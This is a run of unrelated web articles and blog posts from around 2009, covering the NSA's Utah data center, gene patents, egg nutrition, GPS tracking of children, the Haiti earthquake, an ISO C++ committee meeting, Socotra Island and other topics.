Hank McIntire , who said he cannot comment on speculation of that nature .
McIntire did say there has been tremendous interest surrounding Camp Williams and its role following the NSA 's announcement .
He then repeated his earlier statement that the Utah Guard 's role is to provide the real estate for the NSA to build its facility to carry out " specific missions , " whatever those might be .
A hodgepodge of military intelligence and security units from the Utah Guard use Camp Williams for training purposes , including the 1,200 - member 300th Military Intelligence Brigade , which specializes in linguistics intelligence .
McIntire said about 50 percent of the brigade 's ranks are made up of returned LDS missionaries who speak a second language .
Aid considers returned Mormon missionaries perfect for the task .
Being near - native speakers and squeaky - clean , he said , they 're some of the easiest people in the world to get high - level security clearances on .
Aid also finds it interesting that Arabic linguists from Fort Gordon , Ga. , the NSA post responsible for keeping its ear tuned to the Middle East and North Africa , are shuttled to Camp Williams regularly for additional training .
" The best of the best , " he said .
What we know
Reporting on the present and future of the Camp Williams Data Center continues to be a lot like piecing together a jigsaw puzzle , minus the picture on the box lid .
Questions and queries for clarification for this story e-mailed to the NSA at their request generated a return e-mail containing multiple URLs linking to previously published news releases , transcriptions of news conferences and information relating to construction bidding .
No new information was provided .
But by assembling information available in the public domain , including a handful of budget documents sent by the NSA to Congress , the puzzle 's outer edge is starting to emerge .
The budget documents reveal , for example , that $ 207 million has already been spent for initial planning of the center and that the first phase of construction , fast - tracked for two - year completion , will carry a $ 169.5 million price tag .
Phase I construction will include basic infrastructure and installation of security items , such as perimeter fencing and alarms , an interim visitor control center and a vehicle - inspection center for use during construction .
Part of that money will also be spent bringing utilities to the site , relocating some existing National Guard facilities away from the area , as well as surveying the site for unexploded ordnance from previous Utah Guard training .
The NSA has also requested another $ 800 million for the center in 2010 appropriations bills that are now before Congress .
That money would fund a first - phase , 30 - megawatt data center to include " state - of - the - art high - performance computing devices and associated hardware architecture . "
The facility itself will cover approximately 1 million square feet , of which 100,000 square feet will be " mission critical data - center space with raised flooring . "
The remaining 900,000 square feet will be used for technical support and administrative purposes .
Following
Phase I , budget documents show , the NSA intends to request an additional $ 800 million sometime in the future to eventually expand the data center into a 65 - megawatt operation .
Earlier media reports comparing the data center 's 65 - megawatt capacity with the entire power consumption of Salt Lake City were erroneous , according to Rocky Mountain Power spokesman Dave Eskelsen .
Eskelsen says the actual power consumption of Salt Lake City is closer to 420 megawatts , meaning a fully functional data center will draw roughly one - sixth as much power as the capital city .
" It 's a lot of power but not what has been being reported , " Eskelsen said , noting the NSA wo n't be as a large a consumer of power as Kennecott presently is .
The agency " will be in line with our midrange large customers . "
Eskelsen also addressed how system upgrades in the works , including building a new substation to boost capacity , should mitigate potential service disruptions .
" The system is perfectly capable of handling ( the demand ) , as long as the infrastructure is in place to supply it , " Eskelsen said , " and we 're making substantial additions to the infrastructure to handle it . "
September 11
Reasons and rationale for the NSA 's arrival in Utah invariably can be traced to the tragedies of Sept. 11 , 2001 .
Attacks orchestrated on U.S. soil by al - Qaida against the World Trade Center towers and the Pentagon stunned the nation , sending it collectively running into the embrace of the intelligence community , which offered up wondrous and mysterious technologies as protections .
The wake of 9/11 also sealed a new pecking order that had already started shaking out during the previous decade , on the heels of several embarrassing high - profile security breaches and scandals .
So while the Central Intelligence Agency and FBI were losing degrees of influence , the super secretive NSA ascended to fill the void .
The agency 's timing was impeccable .
Keeping the barbarians at bay has proven lucrative for the signals and ciphers business , with Congress and both the Bush and Obama administrations eager , until only recently , to throw wads of money its way .
The result is what Bamford describes as " the largest , most costly and technologically sophisticated spy organization the world has ever known . "
The Utah data center , which will cover 120 acres at Camp Williams , is only part of this ongoing NSA spending spree that has resulted in the doubling of its Fort Meade headquarters .
The spending has also led to major upgrades or replacement of existing facilities at Fort Gordon in Georgia ; Denver , Colo . ; and Wahiawa , Hawaii .
While helping make the rest of the country safer from the threats of terrorists and rogue states , will the NSA 's arrival here in effect paint a giant target on the Utah landscape for terrorism or attack down the road ?
Aid scoffs at such a notion .
He said Utah already has plenty of military targets inside its borders — Dugway Proving Ground , Tooele Army Depot and Hill Air Force Base , to name a few — that make the data center 's arrival inconsequential .
If anything , he thinks the state enjoys security advantages lacked by other locales .
One such advantage is Utah 's proximity deep within the interior of the United States .
Another is having homogeneous demographics .
Both work together to increase the degree of difficulty for potential terrorists to conduct operations .
$ 10 billion question
It 's an annual $ 10 billion debate : Besides providing the NSA 's 60,000 employees with someplace to track people 's Internet - surfing habits , does the agency give America its money 's worth ?
Bamford has his doubts , writing , " Based on the NSA 's history of often being on the wrong end of a surprise and a tendency to mistakenly get the country into , rather than out of , wars , it seems to have a rather disastrous cost - benefit ratio .
Were it a corporation , it would likely have gone belly - up years ago . "
Aid offers a somewhat different take .
" The effectiveness of the NSA is unquantifiable , and I base that on having interviewed over 200 senior intelligence people over the last decade , " Aid said .
" The NSA is overwhelmingly the most prolific and important producer of intelligence in the U.S.
There are hundreds of successes for every known failure . "
It 's entirely possible the answer lies in between .
In his book , Aid quotes former senior State Department official and onetime agency user Herbert Levin as saying , " NSA can point to things they have obtained that have been useful .
But whether they 're worth the billions that are spent is a genuine question in my mind . "

Remember the gene patent rush ?
Companies dashed to call dibs on DNA , while citizens wrung their hands over genetic code as private property .
Well , the patent party could soon be over .
Early last summer , the American Civil Liberties Union spearheaded a lawsuit that challenges the right of U.S. - based Myriad Genetics to hold patents on BRCA gene mutations , diagnostic indicators of increased risk for breast and ovarian cancer .
At stake is n’t just Myriad ’s slice of the DNA strand , but whether or not such material should be “ owned ” in the first place .
“ Gene patents prevent anyone other than the holder of the patent from conducting research on that particular gene , ” reports Censorship News ( Summer 2009 ) .
This biological monopoly dwarfs scientific innovation in more ways than one .
The patents on BRCA mutations , for instance , mean that Myriad has a monopoly on testing for their existence — and charges a $ 3,000 fee for the privilege .
According to Technology Review online ( May 27 , 2009 ) , supporters of gene patents tend to argue that without intellectual property rights , companies would have little incentive to validate genetic tests for diseases .
Ultimately , though , people on both sides of the issue fail to consider that genetically diagnosing diseases is still an immature technology .
There are patents on 20 percent of human genes , biomarkers associated with everything from asthma to Alzheimer ’s .
Yet Myriad ’s BRCA test is among a mere “ handful ” to be clinically validated .
This suggests that , no matter the result , the ACLU ’s case “ misses the real issue , which is how best to push forward and clinically validate the thousands of biomarkers now languishing in databases . ”

Technology Review proposes a government - led project with a scheme for leasing testing rights to organizations willing to do the research .
This public model would eliminate privately patented genes and , more importantly , spur research .
The Egg Debate
Back in the 70’s , consumption of eggs was discouraged by the American Heart Association .
Meanwhile , the British Medical Journal published a study involving 115 , 000 individuals who eat eggs every day for 14 years .
All who participated did not increase their risk for cardiovascular diseases .
In 2016 , a similar study was also published in the American Journal of Clinical Nutrition .
Eggs are High in Cholesterol
Each one - hundred - gram egg supplies 373 mg of cholesterol , which is undeniably high .
But did you know that your liver produces cholesterol too ?
Cholesterol is actually a vital factor in terms of cell and hormonal production .
Two Types of Cholesterol
Cholesterol has two types : the high - density lipoprotein ( the good cholesterol ) and the low - density lipoprotein ( bad cholesterol ) .
Increased HDL levels reduce your risk for cardiovascular problems and improve your cholesterol profile .
Increased LDL levels , on the other hand , cause fatty build - up within artery walls and hence interferes with the delivery of oxygen - rich blood to the brain or heart .
Benefits of Eating Eggs
According to Senior Nutritionist , Saumya Satakshi , eggs do not contain trans fat and contains but a small amount of saturated fats .
The risk of developing cardiovascular diseases is knitted to foods that accompany eggs such as sausages , ham , and bacon .
Eating eggs , per se , offers several health benefits .
For one , it increases your HDL levels , plus it supplies omega - fatty acids that promote heart health by reducing triglycerides .
Second , it aids in weight management since it keeps you feeling satiated for longer .
Eggs are also an inexpensive source of muscle - building protein .
Not to mention they are delicious !
Moreover , the chicken egg , in particular , is actually considered a superfood due to the list of nutrients it contains .
This includes vitamins K , E , D , B12 , B6 , B2 as well as minerals such as selenium , zinc , folate , calcium , choline , and lutein .
How Many Eggs a Day is Okay
The Harvard School of Public Health suggests two to three eggs a day for normal healthy people .
Meanwhile , professional athletes and bodybuilders may consume up to six eggs per day .
However , if you are diabetic or suffering an existing heart ailment , you only need to eat half an egg since you need no more than 300 mg of cholesterol per day .
Bear in mind that one whole egg supplies 212 mg of cholesterol ; thus , there wo n’t be enough room left from other sources .
Nevertheless , you may boil eggs and indulge in its whites .
After all , the cholesterol is within its yolk .
Sadly , its bounty of nutrients is also found in the yolk .
Conclusion
Eggs are a staple ingredient in countless dishes .
Not only does it feature magical qualities that enhance a certain dish , eggs have a bounty of health benefits to give .
Well , we all know that eggs were bombarded with myths in the past but thanks to modern research , we can enjoy the taste of eggs and reap its benefits !
Even if you are no Gordon Ramsey , you can easily whip up a hearty meal with eggs .
Question : if you had the ability to track your child 's every movement during the day , would you do so ?
Or is this an example of helicopter parenting taken to extremes ?
How about tucking a portable GPS unit in her backpack ?
Partaking in my Saturday morning ritual of coffee accompanied by a laptop to scan through the daily newspapers , I came across a Toronto Star article by reporter Robert Cribb , who has been testing the Entourage PS , a portable device offered by a Canadian company called Blackline GPS .
( Wired reviewed an earlier version of this technology by the same company in 2008 . )
The twist on this one is that Robert used the GPS to track his 5 - year - old daughter during her walk to school , slipping the GPS into her backpack , then monitoring it remotely ( on his computer screen or Blackberry ) .
The father in me definitely sees the appeal of this capability – it's very similar to the initial wave of comfort I felt with the concept of being able to log on and watch the goings on at the daycare on webcam .
And like the webcam , the initial " that 's an awesome idea ! " phase wore off a bit the more I thought about it , replaced with the feeling that maybe these things are going just a little too far .
In theory , tracking by GPS is a great parental advantage , but what happens if your kid ducks round a corner to look at something ?
Maybe it violates the instructions of coming straight home , but kids will be kids .
You would n't know any better under normal circumstances .
However , as a red blip on a screen that suddenly deviates from course , do you freeze and stare at it , leap out of a meeting to drive screaming across town to the rescue , or call 9 - 1 - 1 in case it 's a potential abduction ?
What if their backpack is swiped or picked up accidentally at school ?
These things happen and the mix - up could end with police chasing some innocent parent driving their kid home with the wrong backpack .
It 's costly , too :
You'd have to fork out CN$ 350 for the GPS unit itself , plus $ 15 a month for a service subscription .
And then there 's the issue of technology falling into the wrong hands .
It 's not like this is n't a secure service , but we 've seen far too many examples of military communications being intercepted , and nothing is hack - proof .
A planned neighborhood in my city was built with a central playground equipped with video cameras and all the houses were prewired to be able to watch the park on their TVs .
The idea sounded great at first – your kids run off to happily and securely play at the park and you can watch them while you cook dinner .
But like things have a way of doing , the technology was subverted and squabbles broke out over people watching " inappropriately " and the like .
Maybe you gain a bit of personal safety , but potentially lose some with a smattering of confusion and civil discord thrown in with each of these advances .
At any rate , if the concept appeals to you , there are also alternatives that offer similar functionality without the associated costs .
An iPhone , for instance , provides the GPS , and apps like Where the Flock ( WTF ) can give you info like the updated location and speed of not just one person , but anyone you know who packs an iPhone and cares to share with you .
Of course an iPhone and data plan is going to cost a little more than $ 15 month , but it 's also not a one - trick pony .
Personally , I 'm going to continue to do it the old - school way – I 'm fortunate enough to be able to walk my kids to school and back most days ( at least while they 're young enough to still let me ) , but once they 're teenagers , they may each just get a WTF - equipped iPhone for their birthday .
In this animated short , Richard Condie offers up a history lesson about one of the most sensational get - rich - quick schemes that took place in France over 200 years ago .
With economist John Law at the helm , the plan was to open a bank and exchange bank notes for gold at wildly inflated share prices to mask the fact that the country 's gold had been depleted in the building of Louis XIV 's palace .
When the inevitable rush to cash in the notes takes place , poor John Law is left broke and broken - hearted .

Putting a press release out on a Friday is an old PR trick designed to let it fly under the radar .
But let 's be honest , there was no chance of that happening here .
Scottie ?
Given the recent controversy surrounding Gary Coleman , the fact that I 've been repeatedly asked questions about my small part in the movie ' Midgets vs. Mascots , ' and a related video posted online which shows me being assaulted by a group of Little People , I want to clear up any misunderstandings .
" In 2008 , I agreed to play a cameo role in a movie titled ' A Tribute to Big Red ' ( now titled ' Midgets vs. Mascots ' ) .
My role was scripted , and the first two scenes went off without any problems .
During the third scene , I was told that four Little People , along with actor Gary Coleman , were going to become angry with something I said and storm off as the scene ends .
Instead , they basically attacked me , with Gary Coleman apparently climbing on a chair behind me to hit me over the head with a phone ( twice ) .
" A short fight ensued before I heard the film 's director yell ' cut . '
As I recall , some of the Little People were laughing as the director explained that the scene was ' sort of like an episode of the TV show Punk'd . '
At that point , I left quickly without a clear understanding of what was going on .
" As for the Little Person who claims he was injured in the attack , I really do n't think I caused the injury or can be held to blame .
To the best of my knowledge , there is no action being taken against me , nor am I pursuing any action .
For the record , I have never seen the movie and , in hindsight , wish I 'd not been involved with it .
I simply wanted to make clear my role and position as I understand the movie is coming out soon .
I will not be answering any further questions regarding the film . "

PANAMA CITY , Panama — UNFPA , the United Nations Population Fund , extends solidarity and compassion to the people of Haiti who are suffering from the recent devastating earthquake .
The earthquake that hit the country on Tuesday has caused tremendous hardship , injury and loss of life among the general population .
It is also putting thousands of pregnant women at risk from complications and death related to pregnancy and childbirth .
Haiti , the poorest country in the Western Hemisphere , already has by far the highest rate of maternal mortality in the region – 670 deaths per 100,000 live births .
This figure is likely to skyrocket as a direct result of the powerful earthquake , which measured 7.0 on Richter ’s scale .
Pregnant women in and around the country ’s capital , Port - au - Prince , are now without access to even the most basic health services .
Emergency obstetric care is among the most urgent needs .
UNFPA is now working intensely with United Nations partner agencies to protect reproductive health care and conduct rapid health assessments to allow for appropriate , effective and efficient relief operations .
The Fund is providing emergency reproductive health kits containing life - saving supplies for the population affected by the earthquake .
The effect of natural disasters on women and girls is often exacerbated as a direct result of gender discrimination , poverty and their roles as caretakers of children and the ageing .

One Sunday in February 2008 , I faced a dilemma .
After being cooped up all week with a sick 9 - month - old baby , I was desperate to get out of my apartment .
I wanted to go to church .
But I did n't want to expose other children in the church nursery to my son's germs .
So I decided to bring him into the pew with me and my husband — only to learn that my church had chosen that Lenten Sunday for a very solemn service , full of soft chants and contemplative silences .
You can guess where this is going .
My baby made joyful noises at inopportune moments .
An usher asked us if we would take him out .
My husband brought ...
It 's all white , deer :
The incredibly rare sight of an albino fawn hiding in the wilderness
These are the amazing pictures of an incredibly rare baby albino deer dubbed ' White Bambi ' hiding with its mother in the Italian wilderness .
Disturbed by a rustling in the forest the brilliant white deer turns to face it 's stalker , luckily this shot is only with a camera .
The little fawn , thought to be only eight months old , was sighted in the woods by walkers Massimo Del DIn and his daughter Deborah .
Astonishing :
The rare baby albino deer dubbed ' White Bambi ' is spotted in the Italian wilderness by two bush walkers Massimo Del Din and his daughter Deborah
The pair had been trekking in the beautiful Dolomite region , in Belluno , in the Italian Alps , when they caught sight of Bambi through the trees .
Through the branches the little deer and it's mother , who has normal colouring , can be seen turning to face the camera .
Italian authorities have been quick to declare Bambi out of bounds to hunters in the region , which number some 3,500 with a licence to shoot .
It is hoped the measure will stop this Bambi aping his Disney film namesake who famously lost his mother when she was shot by hunters .
Giammaria Sommavilla , provincial police chief of Belluno , confirmed the sighting as extremely rare .
He said : ' I could not believe my eyes , I have never seen an animal like so .
' It is indeed an albino fawn in the picture , taken together with her mother , who instead is normal colour .
' This is not very often we spot something like him , it is very rare and the last records date back many decades . '
Protected : White Bambi stays close to her mother .
Hunters in the region have been told they cannot shoot the albino fawn
Leandro Grones , from the local hunting association , said Bambi has nothing to fear from any other kind of shooting except the camera .
He said : ' Animals like this increases the appeal of the mountain and also feed legends .
' Luckily for Bambi according to one such legend a hunter spotting an albino deer is seeing a soul 's journey toward death and the hunter who kills him will suffer the same fate that year .
' Rules are respected here and we have no problems with poachers .
' In every case , his presence gives us pleasure and enriches our valleys and he is a creature almost magical in winter to see .
' But the colour of the skin and eyes do make him very visible when there is no snow , and this could create problems for the rest of the herd , ' Mr Grones said .
' Deer have a tendency to isolate others for fear of being spotted by predators .
Ugh .
Shut up , bill - killing liberals .
You know who has more liberal cred than all of you ?
Bernie Sanders , who secured $ 10 billion for community health and then voted for cloture .
He would prefer universal single - payer !
He introduced an amendment to that end !
It did not even make it to a vote , though , because of parliamentary tactics , whee .
But he decided , " this bill will help poor and working people , and no bill will hurt them , " and so he is using his leverage to attempt to improve it , like a good socialist senator .
He is not throwing a tantrum ( though he does get shouty sometimes ! ) and inventing a new reality in which this bill 's failure means we 'll totally get a better health care bill next year or something .
I mean , what ?
The options are literally " pass this HANDOUT to the insurance industries ( that they are still lobbying against ! ) that will insure millions of people and improve the social safety net for those in danger of losing their insurance " or " fuck off home to let people continue to die because we got super mad at Senator Fuckface from Connecticut . "
There is not a third " Alan Grayson and Keith Olbermann and Matt Taibbi are all elected to a new kind of Senate that only needs three votes to pass legislation and they declare us Canada for Christmas " option .
Look — we like Alan Grayson .
We will defend him against those centrist " oh but Democrats have to play nice " assholes who say he goes too far when he says truthful things about Rush Limbaugh .
Alan Grayson gives good quote and is a credit to the House of Representatives .
He should continue to let his freak flag fly .
But jesus , christ , an Alan Grayson 2012 primary challenge against Obama ?
Obama , who is not just " Bush - lite " but Bush - same !
( Remember when Bush attempted to negotiate an international climate deal , pass a jobs - focused economic stimulus , reform the nation 's health care industry , and come up with a hopefully coherent plan to end the Afghanistan war in one year ?
And remember how his attempts at all those things were stymied by an uncooperative and undemocratic Senate , but he still managed to make real and tangible gains on each of them ?
Oh , no , you probably do n't remember that because it was a joke we were making about how you have lost all sense of perspective . )
What happens when Alan Grayson is elected president , exactly ?
His sharp tongue embarrasses Ben Nelson into supporting a woman 's right to choose ?
A well - timed quip convinces the Republican party to give up on a scorched - earth style of obstructionist opposition that will probably yield them electoral victories next year ?
He would pull the troops out .
There 's that !
Maybe you would like some members of his cabinet a little more !
But what we actually need , if you like Alan Grayson , is more Alan Graysons in the House and in the Senate .
( Well , what we need is the complete abolition of the Senate too , but let 's start small and aim big , the way progressives did things in the days before a millionaire sportscaster was their spiritual leader . )
The last couple guys broke the nation , basically , and Barack Obama 's best quality might be that he has a very realistic idea of how to begin going about fixing some shit .

Christopher Columbus gets the lion ’s share of the credit for discovering America in 1492 , but the evidence weighs heavily against him being the first on­e to find the New World .
If Columbus had actually discovered America , he'd have found an unpopulated terrain , and of course , he did n’t .
Anthropologists and archaeologists estimate that between 40 and 100 million Native Americans lived in the Americas when Columbus arrived , accounting for as much as one - fifth of the global population at the time [ source : Mann ] .
Besides , some believe the Chinese beat Columbus by 80 years .
While Columbus may have been the first European to reach Central America , it is Giovanni Caboto who is the first to have arrived in North America , landing in Labrador , off the east coast of Canada , in 1497 .
So now we know , ­then :
It was Caboto who was the first European to land in North America , right ?
Wrong again .

Caboto was beaten to North America by 500 years by the Vikings .
Definitive proof of Norse habitation of Newfoundland , near Labrador , can be found at L’Anse aux Meadows , a Viking settlement dating to around 1000 C.E.
The Vikings are the earliest group to leave behind tangible evidence of their presence .
So were the Vikings the first ?
Not quite .
Another group may have been the first Europeans to arrive in the New World : the Irish .
In the sixth century , St. Brendan , an Irish monk who was widely reputed as a skilled seafarer , is said to have undertaken an ambitious voyage .
Brendan , along with a crew of fellow monks , sailed looking for Paradise , the Land of Promise of the Saints .
After seven years exploring mysterious lands , he came upon what he believed to be the fabled paradise .
It was an island so vast that he and his crew failed to reach the far shore after 40 days of walking .
It contained a river that was too wide to be crossed .
It was a wooded land , filled with lush fruits .
He and his men filled their boats with gems they found there and returned home to tell of the news .
­ It was n’t until the ninth century that an account of Brendan 's voyage surfaced , the Navigatio Sancti Brendani ( “ Travels of St. Brendan ” in Latin ) .
It was an instant hit , translated into several languages .
The account talks of Brendan ’s experiences , including his being pelted with rock from an island of fire , seeing a pillar of crystal and encountering a moving island before finally coming upon the Promised Land , which came to be referred to as the Fortunate Islands .
But as time wore on , the Navigatio -- along with St. Brendan himself -- passed into the realm of legend .
If Brendan had lived -- as most scholars assume -- surely he could n’t have traveled across the treacherous North Atlantic with the technology available at the time .
Certainly , he could n’t have beaten the Vikings to North America .
Ironically , it is Viking lore that lends support to the idea that Brendan was the first European in North America .

One of the many frustrations for climate change researchers arising from the current hacked climate emails saga has been the way that so - called sceptics have been given so much uncritical coverage by journalists who are not properly scrutinising their misleading and inaccurate claims .
Take Professor Ian Plimer , for instance , who is now wheeled out by many sceptic groups who are seeking a veneer of academic credibility .
Prof Plimer helped the UK Independence party last week to launch its declaration of climate change denial and is a member of the academic advisory board of Lord Nigel Lawson 's new lobby group , the Global Warming Policy Foundation .
Plimer is gaining lots of new publicity as an " expert sceptic " from parts of the UK media , with numerous TV and radio interviews , full - page opinion pieces in The Mail on Sunday and even a splash on the front page of the Daily Express .
The trouble is that Professor Plimer is not a climate researcher and has not published any scientific papers on the change in climate that we have been witnessing over the past century .
He is an Australian mining geologist who gained fame in his native country for publicly tackling creationists over their denial of the evidence for evolution .
But Prof Plimer has published a book , Heaven and Earth which has become the bible for many climate change sceptics .
His book is riddled with inaccurate information about climate change .
The very first graph in the book , for instance , purports to show temperature observations and projections between 1990 and 2025 .
One of the lines on this graph is labelled " HADCRUT " , indicating that the data source was , allegedly , the Met Office 's Hadley Centre and the Climatic Research Unit at the University of East Anglia .
However , almost none of the data points accurately reflect the official records from the source , and 2008 is completely misrepresented as the coldest year since 1993 .
Elsewhere in his book , Professor Plimer claims 2007 was the coldest year since 2005 , contradicting his own graph , and also disagreeing with all of the official records of global temperature .
But perhaps the most staggering inaccuracy is in the third graph in his book , which is supposed to show global average temperature between 1880 and about 2002 .
It appears to show that the amount of global warming prior to 1945 was much bigger than that since the late 1970s .
This is in complete contrast to the official records maintained by the Met Office , Nasa and the US National Oceanic and Atmospheric Administration , which all show that the warming since the 1970s has been much greater .
So what is the origin of Prof Plimer 's alternative record of global temperatures ?
The book does not cite a source and Prof Plimer has so far refused requests to reveal its provenance .
But one eagle - eyed blogger spotted that it was identical to a graph used in the very first broadcast of the discredited UK TV programme The Great Global Warming Swindle .
Soon after it was broadcast in March 2007 , the programme - makers admitted that the graph had been altered by taking an original graph ( posted on a website to collect names on a petition against ratification of the Kyoto protocol by the United States ) , purporting to show global temperatures up to the mid-1980s .
They had wanted a more up - to - date graph and so had simply stretched the bottom axis and relabeled it as if it extended up to the present .
As a result they missed out all of the warming that has occurred since the mid-1980s , giving the false impression that more warming had occurred before 1945 .
When a UK newspaper revealed the maniupulation , the programme - makers dropped it from repeat broadcasts and the DVD version .
But Prof Plimer appears to have revived it .
Now he is being interviewed around the world as an " expert sceptic " on climate change with some newsworthy alternative views to " balance " the mainstream consensus among researchers .
And his dodgy graphs and inaccurate claims about global temperatures are being portrayed by some parts of the media as a " different side of the story " , when really they are just mistakes presented as fact .

( Newser ) – Investors who hoped that oil - rich Abu Dhabi would write a blank check to cover the massive debts of Dubai—its flashier UAE sister city — got some bad news today .
The capital city will instead " pick and choose " where to help .
" We will look at Dubai 's commitments and approach them on a case - by - case basis , " a government official told Reuters .
" It does not mean that Abu Dhabi will underwrite all of their debts . "
Dubai set off tremors in world markets this week when it announced it would delay payment on $ 60 billion in debt .
" Some of Dubai 's entities are commercial , semi - government ones , " said the Abu Dhabi official , whose government provided $ 15 billion in immediate relief through the central bank of the United Arab Emirates .
No more is coming " until things become clearer .

The ISO C++ committee met in Santa Cruz , CA , USA on October 19 - 24 .
You can find the minutes here , which include the votes at the whole - group sessions but not the details of the breakout technical sessions where we spend most of the week .
The good news is that there ’s little new technical news .
We did a lot of work during the week , but it was mostly working on refining the standard , deciding integration questions of how two language features should work together in cases not clearly described , fixing bugs , and answering national body comments on our first public draft last fall ( those are now nearly all answered ) .
We expect to produce another public draft at our next meeting in March .
We did vote in one small feature that I and Lawrence Crowl in particular had been working on : a simple async ( ) facility to launch asynchronous work easily without messing with packaged_tasks and raw threads .
Here ’s a sample use , also demonstrating a simple use of the futures library and a lambda function for kicks :
future f = std::async( [ ] { OtherWork ( ) ; } ) ; //... do our own work concurrently with OtherWork ... OkayNowWeNeedTheResult ( f.get ( ) ) ; // blocks if necessary until f is ready
If you ’ve been following the futures library , you ’ll notice a name change above : We also renamed unique_future < T > to just plain future < T > as part of recasting the futures wording to make it clearer and more consistent .
That ’s an example of the kind of cleanup work being done .
Near the end of the meeting , we also discussed deprecating export ( as I reported earlier ) and exception specifications other than throw ( ) - nothing .
There seemed to be significant support for deprecating both , and so we ’ll probably see a concrete proposal at our next meeting .
In sad news , the convener ( chair ) of the committee for the past year , P.J. Plauger , stepped down at the end of the meeting .
After I had been the convener for two three - year terms from 2002 to 2008 , I decided it was time for someone else to have a go and so Plauger replaced me a year ago .
He has done a really great job over the past year and his contributions in that role will be missed , but we wo n’t lose his services entirely as he remains an active participant in the committee .
I will probably volunteer again to replace him .
That ’s pretty much it .
The next meeting of the ISO C++ standards committee is in March :

The Yas Marina Hotel is located within the Yas Marina Circuit , Abu Dhabi .
It is the first new hotel in the world to be built over an F1 race circuit .
The hotel ’s exterior surface is designed as an environmentally responsive skin that by day reflects the sky and surroundings and by night is lit by a full color changing LED lighting system that incorporate video feeds that are trasmited over the entire surface of the building .
The Yas hotel , designed by Hani Rashid and Lise Anne Couture , principals of New York based Asymptote Architecture , opened in Abu Dhabi on Nov 1 , 2009 to coincide with the Formula 1 Etihad Airways Abu Dhabi Grand Prix .
A 500 - room , 85,000 - square - meter structure built by Aldar Properties PJSC , the project consists of two twelve story hotel towers linked together by a monocoque steel and glass bridge and Grid Shell structure that both cross above and over the Yas Marina Circuit F1 race track .
Asymptote created and conceived of the building as an architectural landmark embodying key influences and local and global inspirations ranging from the aesthetics and forms associated with speed and spectacle to the artistry and geometries that form the basis of ancient Islamic art and craft traditions .
Of architectural and engineering significance is the main feature of the hotel ?s design ; a 217 - meter expanse of sweeping , curvilinear glass and steel covering that is made up of 5,800 pivoting diamond - shaped glass panels .
This Grid-Shell component is a key aspect of the overall architectural design and significance of the project by producing an atmospheric - like veil visible from miles away .
The two hotel towers , one being set within the race circuit , and another placed in the Marina itself , are physically linked by a sculpted steel monocoque bridge construction that passes above the Formula 1 track .
The bridge along with the Grid- Shell visually connect and fuse the entire Yas Hotel complex .
The Yas Hotel was designed by Asymptote to become a significant and important landmark for Abu Dhabi .
The pixelated lighting design by Asymptote in collaboration with Arup Lighting creates a dynamic appearance at night , with colours flowing smoothly across the double curved surface .
says in a press release
“ The hotel embodies various key influences and inspirations ranging from the aesthetics and forms associated with speed , movement and spectacle to the artistry and geometries forming the basis of ancient Islamic art and craft traditions , a perfect union and harmonious interplay between elegance and spectacle .
The search here was inspired by what one could call the ‘ art ’ and poetics of motor racing , specifically Formula 1 , coupled with the making of a place that celebrates Abu Dhabi as a cultural and technological tour de force . ”

Socotra Island in the Indian Ocean - Very unusual July 17 , 2009
It is like being on a different planet ...
These pictures and information are excellent viewing and reading .
Socotra Island : you have to see it to believe it .
This island simply blows away any notion about what is considered " normal " for a landscape on Earth .
Imagine waking up on the and taking a good look around you .
After a yelp of disbelief , you'd be inclined to think you were transported to another planet - or traveled to another era of Earth 's history .
Socotra Island
The second would be closer to the truth for this island , which is part of a group of 4 islands , has been geographically isolated from mainland Africa for the last 6 or 7 million years .
Like the Galapagos Islands , this island is teeming with 700 extremely rare species of flora and fauna , a full 1/3 of which are endemic , i.e. found nowhere else on Earth .
The climate is harsh , hot and dry , and yet - the most amazing plant life thrives there .
Situated in the Indian Ocean 250 km from Somalia and 340 km from Yemen , the wide sandy beaches rise to limestone plateaus full of caves ( some 7 kilometers in length ) and mountains up to 1525 meters high .
The name Socotra is derived from a Sanscrit name , meaning " The Island of Bliss " ...
Is it the beaches ?
The isolation and quiet ?
Or the strange and crazy botanical allure ?
Alien - looking plants : H. P. Lovecraft 's secret inspiration ?
Was the famous Chtulhu myths creator aware of these forbidding mountains with their hauntingly weird flora ( think of plant mutations from his " The Color out of Space " ) ?
We almost tempted to call Socotra the other " Mountains of Madness " - the trees and plants of this island were preserved thru the long geological isolation , some varieties being 20 million years old ...
We begin with the dracena cinnibaris or Dragon 's Blood Tree , the source of valuable resin for varnishes , dyes , and " cure - all " medicine ; also ( predictably ) used in medieval ritual magic and alchemy .
The branches spread out into the sky and from below appear to hover over the landscape like so many flying saucers ... and from above , they have a distinct mushroom look :
There is also the Desert Rose ( adenium obesium ) which looks like nothing so much as a blooming elephant leg :
Dorstenia gigas - apparently does not require any soil and sinks roots straight into the bare rock :
It also has a distinct personality and likes to smile for the camera :
Somewhat similar to the weird Dorstenia gigas , is this " bucha " vegetable , found as far north as Croatia .
I hope it's not pregnant with anything malignant inside this sack .
John Wyndham ( " The Day of the Triffids " ) would 've loved it :
Also found in Socotra 's landscape is the ever - strange and extremely rare Cucumber Tree ( dendrosicyos socotranum ) - and yes , it 's related to what 's sitting in a pickle jar in your fridge :
Getting around can be a challenge , as there are almost no roads .
Despite the fact that this island has around 40,000 inhabitants , the Yemeni government put in the first roads just 2 years ago - after negotiations with UNESCO , which has declared this island a World Natural Heritage Site .
I would prefer a camel ride to what is bound to be a bumpy and slow 4x4 ride ...
It is a quiet and peaceful enclave in an otherwise troubled world .
If you decide to visit there , you can forget about beachfront hotels and restaurants ; this island is geared towards eco-tourism and sustaining the local economy and way of life .
This island is a birder 's paradise as well , with 140 different species of birds , 10 of which are not found anywhere else in the world .
A unique Socotra warbler , sunbird , starling , bunting , sparrow and cisticola are among the ones found here .
There are also Socotra Cormorants :
Want to see some fairy - tale ( and possibly haunted ) shipwrecks ?
There are diving tours available ...
Hopefully some IMAX crew will film it in all its glory one day .
To give you a glimpse of Socotra 's and Yemen 's in general totally unique architecture , check out this place located on the mainland : Al Hajarah , Yemen - Walled city in the mist
Socotra is one of those " lost world " islands ( separated from the world six million years ago ) where intrepid travelers - particularly those seeking exotic nature and wildlife in a remote tropical setting - can go days on end without rubbing shoulders with that less - than - endangered species : tourists .
Known for decades as the Galapagos of the Indian Ocean , it 's the world 's tenth richest island for endemic plant species .
And it 's the biggest island in the Middle East 125 kilometers in length and 45 kilometers across .
Meanwhile the landscape is one of contrasts ; for example , it has isolated nature preserves with dazzling wildlife , including 900 species of plants , the famous Dragon 's Blood Tree " dracaena cinnabara , " some of the rarest birds that exist nowhere else in the world , and picturesque sandy beaches .

